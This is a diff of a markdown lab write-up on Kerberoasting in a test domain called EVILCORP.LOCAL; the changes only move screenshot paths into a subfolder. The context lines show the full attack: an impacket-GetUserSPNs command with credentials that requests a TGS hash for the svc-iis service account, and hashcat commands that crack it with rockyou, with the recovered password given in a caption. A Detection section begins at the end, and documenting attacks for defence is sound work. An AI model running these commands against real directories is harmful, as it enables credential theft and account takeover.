@@ -8,7 +8,7 @@ bash
 impacket-GetUserSPNs EVILCORP.LOCAL/Orazio.Grinzosi:'Password123!' -dc-ip 10.0.10.10 -request -request-user svc-iis
 
 
-![KERB_ATTACK.png](KERB_ATTACK.png)
+![KERB_ATTACK.png](screenshots/KERB_ATTACK.png)
 _Figure 1: Output of `impacket-GetUserSPNs`. The request for `svc-iis` succeeds and returns a Kerberos TGS hash type `$krb5tgs$23$. This hash is ready for offline cracking with hashcat. Note: the`svc-iis`account has`ADMIN_COUNT=1` but is not protected by a complex password._
 
 ### 2. Offline Cracking with Hashcat
@@ -20,7 +20,7 @@ hashcat -m 13100 svc-iis.hash /usr/share/wordlists/rockyou.txt -r /usr/share/has
 hashcat -m 13100 svc-iis.hash --show
 
 
-![KERB_RESULT.png](KERB_RESULT.png)
+![KERB_RESULT.png](screenshots/KERB_RESULT.png)
 Figure 2: Result of `hashcat --show`. Status `Cracked` indicates the hash was broken. The plaintext password for the `svc-iis` service account is `Password123!`. This demonstrates the account used a weak password present in rockyou.txt.
 
 *Detection*
